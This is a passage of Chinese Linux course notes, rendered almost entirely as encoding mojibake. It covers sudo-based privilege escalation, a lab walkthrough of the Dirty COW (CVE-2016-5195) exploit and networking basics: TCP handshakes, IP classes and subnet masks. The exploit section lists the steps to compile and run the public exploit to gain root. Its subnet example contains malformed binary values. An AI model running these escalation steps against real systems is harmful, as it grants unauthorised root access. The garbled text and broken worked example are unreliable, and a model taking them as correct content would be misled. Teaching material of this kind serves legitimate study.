å°±æ”¹æ‰äº†ï¼Œå†suåˆ‡æ¢åˆ°rootå³å¯ç­‰ç­‰ï¼Œè¿˜æœ‰ä»€ä¹ˆmvã€viã€sedä¿®æ”¹æ–‡ä»¶ã€chmodæ”¹é‡è¦æ–‡ä»¶æƒé™ç­‰ç­‰è¿™é‡Œå°±ä¸å¤šæäº†ã€‚å¤§å®¶å¯ä»¥è¯•è¯•ï¼Œæ™®é€šç”¨æˆ·ä½¿ç”¨sudoæ¥ä¿®æ”¹shadowæ–‡ä»¶çš„rootç”¨æˆ·çš„å¯†ç ã€‚ 7-2 è„ç‰›æå–dcowå…¨ç§°dirty cowï¼Œè„ç‰›ï¼ŒåŸç†ï¼šLinuxå†…æ ¸çš„å†…å­˜å­ç³»ç»Ÿåœ¨å¤„ç†å†™å…¥æ—¶å¤åˆ¶ï¼ˆcopy-on-write, COWï¼Œ ç»„åˆèµ·æ¥æ˜¯ç‰›çš„æ„æ€ï¼‰æ—¶äº§ç”Ÿäº†ç«äº‰æ¡ä»¶ã€‚æ¶æ„ç”¨æˆ·å¯åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ¥è·å–é«˜æƒé™ï¼Œå¯¹åªè¯»å†…å­˜æ˜ å°„è¿› è¡Œå†™è®¿é—®ï¼Œæ‰€ä»¥å¤§å®¶éƒ½ç®¡è¿™ä¸ªææƒæ–¹å¼å«åšè„ç‰›ææƒã€‚åŸç†è¿™ä¸€å—å¤§å®¶ä¸éœ€è¦æŒæ¡ï¼Œä¼šç›‘æµ‹æ˜¯å¦å­˜åœ¨è¿™ ä¸ªæ¼æ´å³å¯ã€‚ ## ä»“åº“åœ°å€ï¼šhttps://github.com/gbonacini/CVE-2016-5195ï¼Œå…ˆä¸‹è½½ä¸‹æ¥ï¼Œæˆ‘ä¹Ÿç»™å¤§å®¶ä¸‹è½½å¥½äº†ï¼Œåœ¨å·¥å…·æ–‡ä»¶å¤¹ä¸­# githubä¸Šå¯¹å®ƒæœ‰ä»‹ç»ï¼Œæ¯”å¦‚å“ªäº›ç‰ˆæœ¬çš„ç³»ç»Ÿæœ‰è¿™æ ·çš„æ¼æ´ã€‚è¦æŸä¸ªç³»ç»Ÿç‰ˆæœ¬å’Œgccç‰ˆæœ¬åŒæ—¶æ»¡è¶³çš„æ—¶å€™æ‰ä¼šæœ‰è¿™ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬çš„centos7.8è™½ç„¶ç³»ç»Ÿç‰ˆæœ¬èƒ½å¯¹ä¸Šï¼Œä½†æ˜¯gccç‰ˆæœ¬é«˜ï¼Œå¯¹ä¸ä¸Šï¼Œæ‰€æœ‰æ²¡æœ‰è¿™ä¸ªæ¼æ´ï¼Œä¸èƒ½ç”¨è¿™ä¸ªç¨‹åºææƒï¼Œæ‰€ä»¥æˆ‘ç»™å¤§å®¶å‡†å¤‡äº†ä¸€ä¸ªè™šæ‹Ÿæœºç³»ç»Ÿï¼Œå¤§å®¶æ‰“å¼€ç›´æ¥ç”¨æ¥ç©ç©å³å¯ã€‚ å¦‚ä¸‹ï¼ŒåŒå‡»æ‰“å¼€ï¼Œæˆ–è€…å³é”®é€‰æ‹©VMwareæ‰“å¼€å³å¯ å¦‚ä¸‹ï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç å³å¯ï¼Œrootç”¨æˆ·çš„å¯†ç æ˜¯123456ï¼Œ å…ˆåˆ›å»ºä¸ªæ™®é€šç”¨æˆ·ï¼š ç„¶åxshellè¿æ¥ä¸€ä¸‹ä¸»æœºï¼Œç”¨jadenæ¥ç™»å½•ï¼Œå°†è„ç‰›çš„ææƒç¨‹åºä¸Šä¼ è¿‡æ¥ã€‚ å¥½ï¼Œå¼€å§‹ææƒã€‚ #ä¸Šä¼ æ–‡ä»¶ è„ç‰›ææƒ.zipunzip è„ç‰›ææƒ.zipcd CVE-2016-5195-master/make #ç¼–è¯‘./dcow -s #ææƒ# çœ‹å†…æ ¸ç‰ˆæœ¬ï¼Œæ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨çš„[jaden@dms CVE-2016-5195-master]$ cat /etc/redhat-release CentOS Linux release 7.2.1511 (Core) è¿™å°±ææƒå®Œäº‹å„¿äº†ï¼Œå¦‚ä¸‹ ## è¯´æ˜è¿™ä¸ªç³»ç»Ÿæœ‰è¿™ä¸ªæ¼æ´ï¼Œè§£å†³è¿™ä¸ªæ¼æ´å°±æ˜¯å‡çº§ç³»ç»Ÿæˆ–è€…å‡çº§gccè½¯ä»¶ç‰ˆæœ¬ã€‚ä¹Ÿå¯ä»¥ç”¨æˆ‘ä»¬çš„centos7.8è‡ªå·±è¯•è¯•ï¼Œåº”è¯¥æ˜¯ä¸èƒ½ææƒã€‚ 2.24.8 VMwareå¯¼å‡ºOVAå’ŒOVF ä¸‰ï¼Œç½‘ç»œ3.1 osi 7å±‚æ¨¡å‹ ## å¤§å®¶åˆ¶å®šåè®®çš„æ—¶å€™ï¼ŒåŸºæœ¬éƒ½æ˜¯éµå¾ªçš„osiä¸ƒå±‚æ¨¡å‹æ¥è®¾è®¡çš„ã€‚ ## æ¯ä¸€å±‚éƒ½è®¾è®¡å‡ºäº†å¾ˆå¤šç§åè®®ï¼Œæ¥å®Œæˆç‰¹å®šçš„å·¥ä½œå’Œæ•°æ®ä¼ è¾“ï¼Œå…¶å®ç®€å•ç†è§£åè®®çš„è¯ï¼Œå…¶å®å°±æ˜¯ä¸åŒåè®®éœ€è¦åŠ å·¥ä¸åŒçš„æ•°æ®æ ¼å¼ã€‚ 3.1.1 æŸ¥çœ‹åˆ°è¿è¡Œç¨‹åºçš„ç«¯å£netstat -ano ## ---------------- windowsnetstat -lntup ## ---------------- Linux 3.2 cpä¸‰æ¬¡æ¡æ‰‹ï¼Œå››æ¬¡æŒ¥æ‰‹3.2.1 å¸¸ç”¨çš„ç«¯å£å·ï¼š 3.2.2 TCPåè®®æ•°æ®å¤´ç‰¹æ®Šå«ä¹‰SYN å»ºç«‹é“¾æ¥ACK å›åº”æ ‡è¯†FIN æ–­å¼€é“¾æ¥PSH æ•°æ®åŒ…RST é‡ç½®ï¼ˆé‡ä¼ ï¼‰ ç½‘ç»œä¸ç¨³å®šçš„æ—¶å€™ä¼šçœ‹åˆ°å¥½å¤šé‡å‘åŒ…URG ç´§æ€¥æŒ‡é’ˆ 3.2.3 TCPä¸‰æ¬¡æ¡æ‰‹## 1ã€TCPæœåŠ¡å™¨è¿›ç¨‹å…ˆåˆ›å»ºä¼ è¾“æ§åˆ¶å—TCBï¼Œæ—¶åˆ»å‡†å¤‡æ¥å—å®¢æˆ·è¿›ç¨‹çš„è¿æ¥è¯·æ±‚ï¼Œæ­¤æ—¶æœåŠ¡å™¨å°±è¿›å…¥äº†LISTENï¼ˆç›‘å¬ï¼‰çŠ¶æ€ï¼›## 2ã€TCPå®¢æˆ·è¿›ç¨‹ä¹Ÿæ˜¯å…ˆåˆ›å»ºä¼ è¾“æ§åˆ¶å—TCBï¼Œç„¶åå‘æœåŠ¡å™¨å‘å‡ºè¿æ¥è¯·æ±‚æŠ¥æ–‡ï¼Œè¿™æ˜¯æŠ¥æ–‡é¦–éƒ¨ä¸­çš„åŒéƒ¨ä½SYN=1ï¼ŒåŒæ—¶é€‰æ‹©ä¸€ä¸ªåˆå§‹åºåˆ—å· seq=x ï¼Œæ­¤æ—¶ï¼ŒTCPå®¢æˆ·ç«¯è¿›ç¨‹è¿›å…¥äº† SYN-SENTï¼ˆåŒæ­¥å·²å‘é€çŠ¶æ€ï¼‰çŠ¶æ€ã€‚TCPè§„å®šï¼ŒSYNæŠ¥æ–‡æ®µï¼ˆSYN=1çš„æŠ¥æ–‡æ®µï¼‰ä¸èƒ½æºå¸¦æ•°æ®ï¼Œä½†éœ€è¦æ¶ˆè€—æ‰ä¸€ä¸ªåºå·ã€‚## 3ã€TCPæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚æŠ¥æ–‡åï¼Œå¦‚æœåŒæ„è¿æ¥ï¼Œåˆ™å‘å‡ºç¡®è®¤æŠ¥æ–‡ã€‚ç¡®è®¤æŠ¥æ–‡ä¸­åº”è¯¥ ACK=1ï¼ŒSYN=1ï¼Œç¡®è®¤å·æ˜¯ack=x+1ï¼ŒåŒæ—¶ä¹Ÿè¦ä¸ºè‡ªå·±åˆå§‹åŒ–ä¸€ä¸ªåºåˆ—å· seq=yï¼Œæ­¤æ—¶ï¼ŒTCPæœåŠ¡å™¨è¿›ç¨‹è¿›å…¥äº†SYN-RCVDï¼ˆåŒæ­¥æ”¶åˆ°ï¼‰çŠ¶æ€ã€‚è¿™ä¸ªæŠ¥æ–‡ä¹Ÿä¸èƒ½æºå¸¦æ•°æ®ï¼Œä½†æ˜¯åŒæ ·è¦æ¶ˆè€—ä¸€ä¸ªåºå·ã€‚## 4ã€TCPå®¢æˆ·è¿›ç¨‹æ”¶åˆ°ç¡®è®¤åï¼Œè¿˜è¦å‘æœåŠ¡å™¨ç»™å‡ºç¡®è®¤ã€‚ç¡®è®¤æŠ¥æ–‡çš„ACK=1ï¼Œack=y+1ï¼Œè‡ªå·±çš„åºåˆ—å·seq=x+1ï¼Œæ­¤æ—¶ï¼ŒTCPè¿æ¥å»ºç«‹ï¼Œå®¢æˆ·ç«¯è¿›å…¥ESTABLISHEDï¼ˆå·²å»ºç«‹è¿æ¥ï¼‰çŠ¶æ€ã€‚TCPè§„å®šï¼ŒACKæŠ¥æ–‡æ®µå¯ä»¥æºå¸¦æ•°æ®ï¼Œä½†æ˜¯å¦‚æœä¸æºå¸¦æ•°æ®åˆ™ä¸æ¶ˆè€—åºå·ã€‚## 5ã€å½“æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯çš„ç¡®è®¤åä¹Ÿè¿›å…¥ESTABLISHEDçŠ¶æ€ï¼Œæ­¤ååŒæ–¹å°±å¯ä»¥å¼€å§‹é€šä¿¡äº†ã€‚ 3.2.4 å››æ¬¡æŒ¥æ‰‹## 1ã€å®¢æˆ·ç«¯è¿›ç¨‹å‘å‡ºè¿æ¥é‡Šæ”¾æŠ¥æ–‡ï¼Œå¹¶ä¸”åœæ­¢å‘é€æ•°æ®ã€‚é‡Šæ”¾æ•°æ®æŠ¥æ–‡é¦–éƒ¨ï¼ŒFIN=1ï¼Œå…¶åºåˆ—å·ä¸ºseq=uï¼ˆç­‰äºå‰é¢å·²ç»ä¼ é€è¿‡æ¥çš„æ•°æ®çš„æœ€åä¸€ä¸ªå­—èŠ‚çš„åºå·åŠ 1ï¼‰ï¼Œæ­¤æ—¶ï¼Œå®¢æˆ·ç«¯è¿›å…¥FIN-WAIT-1ï¼ˆç»ˆæ­¢ç­‰å¾…1ï¼‰çŠ¶æ€ã€‚TCPè§„å®šï¼ŒFINæŠ¥æ–‡æ®µå³ä½¿ä¸æºå¸¦æ•°æ®ï¼Œä¹Ÿè¦æ¶ˆè€—ä¸€ä¸ªåºå·ã€‚## 2ã€æœåŠ¡å™¨æ”¶åˆ°è¿æ¥é‡Šæ”¾æŠ¥æ–‡ï¼Œå‘å‡ºç¡®è®¤æŠ¥æ–‡ï¼ŒACK=1ï¼Œack=u+1ï¼Œå¹¶ä¸”å¸¦ä¸Šè‡ªå·±çš„åºåˆ—å·seq=vï¼Œæ­¤æ—¶ï¼ŒæœåŠ¡ç«¯å°±è¿›å…¥äº†CLOSE-WAITï¼ˆå…³é—­ç­‰å¾…ï¼‰çŠ¶æ€ã€‚TCPæœåŠ¡å™¨é€šçŸ¥é«˜å±‚çš„åº”ç”¨è¿›ç¨‹ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨çš„æ–¹å‘å°±é‡Šæ”¾äº†ï¼Œè¿™æ—¶å€™å¤„äºåŠå…³é—­çŠ¶æ€ï¼Œå³å®¢æˆ·ç«¯å·²ç»æ²¡æœ‰æ•°æ®è¦å‘é€äº†ï¼Œä½†æ˜¯æœåŠ¡å™¨è‹¥å‘é€æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¾ç„¶è¦æ¥å—ã€‚è¿™ä¸ªçŠ¶æ€è¿˜è¦æŒç»­ä¸€æ®µæ—¶é—´ï¼Œä¹Ÿå°±æ˜¯æ•´ä¸ªCLOSE-WAITçŠ¶æ€æŒç»­çš„æ—¶é—´ã€‚## 3ã€å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨çš„ç¡®è®¤è¯·æ±‚åï¼Œæ­¤æ—¶ï¼Œå®¢æˆ·ç«¯å°±è¿›å…¥FIN-WAIT-2ï¼ˆç»ˆæ­¢ç­‰å¾…2ï¼‰çŠ¶æ€ï¼Œç­‰å¾…æœåŠ¡å™¨å‘é€è¿æ¥é‡Šæ”¾æŠ¥æ–‡ï¼ˆåœ¨è¿™ä¹‹å‰è¿˜éœ€è¦æ¥å—æœåŠ¡å™¨å‘é€çš„æœ€åçš„æ•°æ®ï¼‰ã€‚## 4ã€æœåŠ¡å™¨å°†æœ€åçš„æ•°æ®å‘é€å®Œæ¯•åï¼Œå°±å‘å®¢æˆ·ç«¯å‘é€è¿æ¥é‡Šæ”¾æŠ¥æ–‡ï¼ŒFIN=1ï¼Œack=u+1ï¼Œç”±äºåœ¨åŠå…³é—­çŠ¶æ€ï¼ŒæœåŠ¡å™¨å¾ˆå¯èƒ½åˆå‘é€äº†ä¸€äº›æ•°æ®ï¼Œå‡å®šæ­¤æ—¶çš„åºåˆ—å·ä¸ºseq=wï¼Œæ­¤æ—¶ï¼ŒæœåŠ¡å™¨å°±è¿›å…¥äº†LAST-ACKï¼ˆæœ€åç¡®è®¤ï¼‰çŠ¶æ€ï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„ç¡®è®¤ã€‚## 5ã€å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨çš„è¿æ¥é‡Šæ”¾æŠ¥æ–‡åï¼Œå¿…é¡»å‘å‡ºç¡®è®¤ï¼ŒACK=1ï¼Œack=w+1ï¼Œè€Œè‡ªå·±çš„åºåˆ—å·æ˜¯seq=u+1ï¼Œæ­¤æ—¶ï¼Œå®¢æˆ·ç«¯å°±è¿›å…¥äº†TIME-WAITï¼ˆæ—¶é—´ç­‰å¾…ï¼‰çŠ¶æ€ã€‚æ³¨æ„æ­¤æ—¶TCPè¿æ¥è¿˜æ²¡æœ‰é‡Šæ”¾ï¼Œå¿…é¡»ç»è¿‡2âˆ—âˆ—MSLï¼ˆæœ€é•¿æŠ¥æ–‡æ®µå¯¿å‘½ï¼‰çš„æ—¶é—´åï¼Œå½“å®¢æˆ·ç«¯æ’¤é”€ç›¸åº”çš„TCBåï¼Œæ‰è¿›å…¥CLOSEDçŠ¶æ€ã€‚## 6ã€æœåŠ¡å™¨åªè¦æ”¶åˆ°äº†å®¢æˆ·ç«¯å‘å‡ºçš„ç¡®è®¤ï¼Œç«‹å³è¿›å…¥CLOSEDçŠ¶æ€ã€‚åŒæ ·ï¼Œæ’¤é”€TCBåï¼Œå°±ç»“æŸäº†è¿™æ¬¡çš„TCPè¿æ¥ã€‚å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨ç»“æŸTCPè¿æ¥çš„æ—¶é—´è¦æ¯”å®¢æˆ·ç«¯æ—©ä¸€äº›ã€‚ 3.2.5 ä¸ºä»€ä¹ˆå»ºç«‹è¿æ¥æ˜¯ä¸‰æ¬¡æ¡æ‰‹ï¼Œå…³é—­è¿æ¥ç¡®æ˜¯å››æ¬¡æŒ¥æ‰‹å‘¢ï¼Ÿ## 1ã€å»ºç«‹è¿æ¥çš„æ—¶å€™ï¼Œ æœåŠ¡å™¨åœ¨LISTENçŠ¶æ€ä¸‹ï¼Œæ”¶åˆ°å»ºç«‹è¿æ¥è¯·æ±‚çš„SYNæŠ¥æ–‡åï¼ŒæŠŠACKå’ŒSYNæ”¾åœ¨ä¸€ä¸ªæŠ¥æ–‡é‡Œå‘é€ç»™å®¢æˆ·ç«¯ã€‚## 2ã€è€Œå…³é—­è¿æ¥æ—¶ï¼ŒæœåŠ¡å™¨æ”¶åˆ°å¯¹æ–¹çš„FINæŠ¥æ–‡æ—¶ï¼Œä»…ä»…è¡¨ç¤ºå¯¹æ–¹ä¸å†å‘é€æ•°æ®äº†ä½†æ˜¯è¿˜èƒ½æ¥æ”¶æ•°æ®ï¼Œè€Œè‡ªå·±ä¹Ÿæœªå¿…å…¨éƒ¨æ•°æ®éƒ½å‘é€ç»™å¯¹æ–¹äº†ï¼Œæ‰€ä»¥å·±æ–¹å¯ä»¥ç«‹å³å…³é—­ï¼Œä¹Ÿå¯ä»¥å‘é€ä¸€äº›æ•°æ®ç»™å¯¹æ–¹åï¼Œå†å‘é€FINæŠ¥æ–‡ç»™å¯¹æ–¹æ¥è¡¨ç¤ºåŒæ„ç°åœ¨å…³é—­è¿æ¥ï¼Œå› æ­¤ï¼Œå·±æ–¹ACKå’ŒFINä¸€èˆ¬éƒ½ä¼šåˆ†å¼€å‘é€ï¼Œä»è€Œå¯¼è‡´å¤šäº†ä¸€æ¬¡ã€‚ 3.2.6 å¦‚æœå·²ç»å»ºç«‹äº†è¿æ¥ï¼Œä½†æ˜¯å®¢æˆ·ç«¯çªç„¶å‡ºç°æ•…éšœäº†æ€ä¹ˆåŠï¼Ÿ## TCPè¿˜è®¾æœ‰ä¸€ä¸ªä¿æ´»è®¡æ—¶å™¨ï¼Œæ˜¾ç„¶ï¼Œå®¢æˆ·ç«¯å¦‚æœå‡ºç°æ•…éšœï¼ŒæœåŠ¡å™¨ä¸èƒ½ä¸€ç›´ç­‰ä¸‹å»ï¼Œç™½ç™½æµªè´¹èµ„æºã€‚æœåŠ¡å™¨æ¯æ”¶åˆ°ä¸€æ¬¡å®¢æˆ·ç«¯çš„è¯·æ±‚åéƒ½ä¼šé‡æ–°å¤ä½è¿™ä¸ªè®¡æ—¶å™¨ï¼Œæ—¶é—´é€šå¸¸æ˜¯è®¾ç½®ä¸º2å°æ—¶ï¼Œè‹¥ä¸¤å°æ—¶è¿˜æ²¡æœ‰æ”¶åˆ°å®¢æˆ·ç«¯çš„ä»»ä½•æ•°æ®ï¼ŒæœåŠ¡å™¨å°±ä¼šå‘é€ä¸€ä¸ªæ¢æµ‹æŠ¥æ–‡æ®µï¼Œä»¥åæ¯éš”75åˆ†é’Ÿå‘é€ä¸€æ¬¡ã€‚è‹¥ä¸€è¿å‘é€10ä¸ªæ¢æµ‹æŠ¥æ–‡ä»ç„¶æ²¡ååº”ï¼ŒæœåŠ¡å™¨å°±è®¤ä¸ºå®¢æˆ·ç«¯å‡ºäº†æ•…éšœï¼Œæ¥ç€å°±å…³é—­è¿æ¥ã€‚ 3.3 ipåœ°å€åˆ’åˆ†3.3.1 å…¬ç½‘IP## aç±» 1.0.0.1~126.255.255.254 # 126*2^8 5.0.0.0 -- 5.255.255.255 ## ç¬¬ä¸€ç»„ï¼š1-126å¼€å¤´çš„åœ°å€æ˜¯Aç±» ## 0Aç±»127 å…¬ç½‘ipåœ¨è¿™ä¸ªåœ°å€æ®µçš„å±…å¤šï¼Œping qq.comå°±å¯ä»¥çœ‹åˆ°58.250.137.36è¿™å°±æ˜¯ä¸ªAç±»åœ°å€ã€‚## bç±» 128.0.0.1~191.255.255.254 ## 128=Bç±»192 ## cç±» 192.0.0.1~223.255.255.254 # Aç±»ã€Bç±»ã€Cç±»åœ°å€ä¸ºä¸‰ç±»ä¸»è¦çš„IPåœ°å€ï¼Œä¸‹é¢ä¸¤ç±»æˆ‘ä»¬åŸºæœ¬è§ä¸åˆ°ã€‚## dç±» ç»„æ’­ï¼ŒVRRPåè®®ï¼Œkeepaliveé«˜å¯ç”¨ 224~239 ## eç±» ç§‘ç ” 240-255 # è¯´æ˜¯ä¿ç•™ç»™ç§‘ç ”ç”¨çš„## ä»”ç»†çœ‹çš„è¯ï¼Œå¯ä»¥çœ‹åˆ°aç±»å’Œbç±»ä¸­é—´çš„127åœ°å€æ®µæ²¡æœ‰åˆ’åˆ†ä¸Šï¼Œ127.0.0.1 - 127.255.255.255æ•´ä¸ªç½‘æ®µéƒ½æ˜¯ç‰¹æ®Šåœ°å€ï¼Œ127å¼€å¤´çš„åœ°å€å¯ä»¥è¯´æ˜¯Aç±»çš„ä¿ç•™åœ°å€ï¼Œç”¨ä½œæœ¬åœ°è½¯ä»¶ç¯å›æµ‹è¯•ï¼ˆloopback testï¼‰æœ¬ä¸»æœºçš„è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡è€Œä½¿ç”¨çš„ã€‚è¿™ä¸ªåé¢æˆ‘ä»¬ç”¨åˆ°ä¹‹åå†æã€‚ 3.3.2 ç§ç½‘IP## Aç±»ï¼š10.0.0.0~10.255.255.255 # é€šè¿‡ç½‘ä¸Šçš„ipåœ°å€è®¡ç®—å™¨ï¼Œå°±èƒ½è®¡ç®—å‡ºè¿™ä¸ªç½‘æ®µæœ‰å¤šå°‘ä¸ªipåœ°å€ï¼Œ Aç±»åœ°å€å­ç½‘æ©ç æ˜¯8ä½ # 16777214 ## Bç±»ï¼š172.16.0.0~172.31.255.255 # Bç±»åœ°å€å­ç½‘æ©ç æ˜¯16ä½## Cç±»ï¼š192.168.0.0~192.168.255.255 # è¿™ä¸ªæ˜¯æˆ‘ä»¬ç»å¸¸çœ‹åˆ°çš„ç½‘æ®µï¼Œå†…ç½‘ä¸­ç½‘ç»œè®¾å¤‡æ¯”è¾ƒå°‘çš„åœºæ™¯éƒ½ç”¨çš„è¿™ä¸ªï¼Œæˆ‘ä»¬ä¹°è·¯ç”±å™¨çš„æ—¶å€™ï¼Œè·¯ç”±å™¨ä¸Šå†…ç½®çš„ç½‘æ®µå¤šæ•°ä¹Ÿæ˜¯è¿™ä¸ªç½‘æ®µã€‚ # 65,536 3.3.3 ipv6## 1ï¼šipv6ï¼šfe80::2e60:cff:fe9c:a4b3 # 2^128æ¬¡æ–¹çš„ä½æ•°ï¼Œè¿™ä¸ªæ•°é‡å°±ç›¸å½“å¯è§‚äº†ã€‚åœ¨è¿™ç§å½¢å¼ä¸­ï¼Œ128ä½çš„IPv6åœ°å€è¢«åˆ†ä¸º8ç»„ï¼Œæ¯ç»„çš„16ä½ç”¨4ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ï¼ˆ0ï½9ï¼ŒAï½Fï¼‰æ¥è¡¨ç¤ºï¼Œç»„å’Œç»„ä¹‹é—´ç”¨å†’å·ï¼ˆ:ï¼‰éš”å¼€ã€‚æ¯”å¦‚IPv6åœ°å€2001:db8:130F:0000:0000:09C0:876A:130Bï¼Œä¸ºäº†ä¹¦å†™æ–¹ä¾¿ï¼Œæ¯ç»„ä¸­çš„å‰å¯¼â€œ0â€éƒ½å¯ä»¥çœç•¥ï¼Œæ‰€ä»¥ä¸Šè¿°åœ°å€å¯å†™ä¸ºï¼š2001:db8:130F:0:0:9C0:876A:130Bã€‚ ## å¦å¤–ï¼Œåœ°å€ä¸­åŒ…å«çš„è¿ç»­ä¸¤ä¸ªæˆ–å¤šä¸ªå‡ä¸º0çš„ç»„ï¼Œå¯ä»¥ç”¨åŒå†’å·â€œ::â€æ¥ä»£æ›¿ï¼Œè¿™æ ·å¯ä»¥å‹ç¼©IPv6åœ°å€ä¹¦å†™æ—¶çš„é•¿åº¦ï¼Œæ‰€ä»¥ä¸Šè¿°åœ°å€åˆå¯ä»¥è¿›ä¸€æ­¥ç®€å†™ä¸ºï¼š2001:db8:130F::9C0:876A:130Bã€‚ ## 2: NATï¼šnetwork address transformationï¼Œç½‘ç»œåœ°å€è½¬æ¢ ## å¥½å¤„ï¼š ## a: èŠ‚çº¦å¤§é‡çš„å…¬ç½‘ipåœ°å€ ## bï¼šå‡å°‘äº†ç½‘ç»œæ”»å‡» 3.4 å­ç½‘æ©ç çš„ä½œç”¨## ipåœ°å€åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ† ## ç½‘ç»œéƒ¨åˆ†ï¼šæ ‡è¯†å­ç½‘ï¼Œä¹Ÿå°±æ˜¯ç½‘ç»œä½æˆ–è€…è¯´ç½‘æ®µ ## ä¸»æœºéƒ¨åˆ†ï¼šæ ‡è¯†ä¸»æœº ## æ³¨æ„ï¼šå•çº¯çš„ipåœ°å€æ®µåªæ˜¯æ ‡è¯†äº†ipåœ°å€çš„ç§ç±»ï¼Œä»ç½‘ç»œéƒ¨åˆ†æˆ–ä¸»æœºéƒ¨åˆ†éƒ½æ— æ³•è¾¨è¯†ä¸€ä¸ªipæ‰€å¤„çš„å­ç½‘ ## ä¾‹ï¼š172.16.10.1ä¸172.16.10.2å¹¶ä¸èƒ½ç¡®å®šäºŒè€…å¤„äºåŒä¸€å­ç½‘ ## æ‰€è°“å­ç½‘æ©ç ï¼Œå°±æ˜¯è¡¨ç¤ºå­ç½‘ç»œç‰¹å¾çš„ä¸€ä¸ªå‚æ•°ã€‚å®ƒåœ¨å½¢å¼ä¸Šç­‰åŒäºIPåœ°å€ï¼Œä¹Ÿæ˜¯ä¸€ä¸ª32ä½äºŒè¿›åˆ¶æ•°å­—ï¼Œå®ƒçš„ç½‘ç»œéƒ¨åˆ†å…¨éƒ¨ä¸º1ï¼Œä¸»æœºéƒ¨åˆ†å…¨éƒ¨ä¸º0ã€‚æ¯”å¦‚ï¼ŒIPåœ°å€172.16.10.1ï¼Œå¦‚æœå·²çŸ¥ç½‘ç»œéƒ¨åˆ†æ˜¯å‰24ä½ï¼Œä¸»æœºéƒ¨åˆ†æ˜¯å8ä½ï¼Œé‚£ä¹ˆå­ç½‘ç»œæ©ç å°±æ˜¯11111111.11111111.11111111.00000000ï¼Œå†™æˆåè¿›åˆ¶å°±æ˜¯255.255.255.0ã€‚ å­ç½‘æ©ç ï¼šå†³å®šäº†ä¸€ä¸ªç½‘æ®µçš„å¤§å°ï¼Œç½‘æ®µå¤§å°å†³å®šäº†æœ‰å¤šå°‘ä¸ªipåœ°å€å¯ä»¥ç”¨ï¼Œç½‘æ®µè¶Šå¤§ï¼Œipåœ°å€è¶Šå¤šã€‚ ## ipåœ°å€ï¼š192.168.2.110 å­ç½‘æ©ç ï¼š255.255.255.0 ## ä¸Šé¢ä¸¤ä¸ªè¿˜æœ‰ä¸€ä¸ªç­‰æ•ˆçš„å†™æ³•ï¼š192.168.2.110/24 å¦‚ä¸‹å†™æ³• 192.168.2.118/24 10.0.0.0/8 172.16.0.0/16# æ€ä¹ˆç¡®å®šç½‘æ®µçš„å¤§å°å‘¢ï¼Œå°±è¦çœ‹å­ç½‘æ©ç ï¼Œ8ä½ã€16ä½ã€24ä½ç­‰å°±æ˜¯ä»£è¡¨å­ç½‘æ©ç çš„å€¼çš„ã€‚æ•°å­—è¶Šå°çš„ï¼Œè¡¨ç¤ºç½‘æ®µè¶Šå¤§ã€‚ 3.4.1 å­ç½‘æ©ç æ˜¯æ€ä¹ˆè®¡ç®—ç½‘æ®µå¤§å°\té¦–å…ˆçŸ¥é“å­ç½‘æ©ç ï¼Œæˆ‘ä»¬å°±èƒ½åˆ¤æ–­ï¼Œä»»æ„ä¸¤ä¸ªIPåœ°å€æ˜¯å¦å¤„åœ¨åŒä¸€ä¸ªå­ç½‘ç»œã€‚æ–¹æ³•å°±æ˜¯å°†ä¸¤ä¸ªIPåœ°å€ä¸ å­ç½‘æ©ç åˆ†åˆ«è¿›è¡ŒäºŒè¿›åˆ¶çš„ANDè¿ç®—ï¼Œä¹Ÿå«ä¸è¿ç®—ï¼ˆä¸¤ä¸ªæ•°ä½éƒ½ä¸º1ï¼Œè¿ç®—ç»“æœä¸º1ï¼Œå¦åˆ™ä¸º0ï¼‰ï¼Œç„¶å æ¯”è¾ƒç»“æœæ˜¯å¦ç›¸åŒï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°±è¡¨æ˜å®ƒä»¬åœ¨åŒä¸€ä¸ªå­ç½‘ç»œä¸­ï¼Œå¦åˆ™å°±ä¸æ˜¯ã€‚ ## æ¯”å¦‚ï¼Œå·²çŸ¥IPåœ°å€172.16.10.1å’Œ172.16.10.2çš„å­ç½‘æ©ç éƒ½æ˜¯255.255.255.0ï¼Œè¯·é—®å®ƒä»¬æ˜¯å¦åœ¨åŒä¸€ä¸ªå­ç½‘ç»œï¼Ÿä¸¤è€…ä¸å­ç½‘æ©ç åˆ†åˆ«è¿›è¡ŒANDè¿ç®—: 172.16.10.1ï¼š 10101100.00010000.00001010.00000001 255.255.255.0ï¼š 11111111.11111111.11111111.00000000 10101100.00010000.00001010.00000000## ä¸¤ä¸ªANDè¿ç®—å¾—ç½‘ç»œåœ°å€ç»“æœï¼š10101100.00010000.00001010.00000000-172.16.10.0 172.16.10.2ï¼š 10101100.00010000.00001010.000000010 255.255.255.0ï¼š11111111.11111111.11111111.00000000 10101100.00010000.00001010.000000001 ## ANDè¿ç®—å¾—ç½‘ç»œåœ°å€ç»“æœï¼š10101100.00010000.00001010.000000001-172.16.10.0## è®¡ç®—å¾—åˆ°çš„172.16.10.0ï¼Œå°±è¯´æ˜è¿™ä¸ªç½‘æ®µæ˜¯172.16.10.xã€‚ # 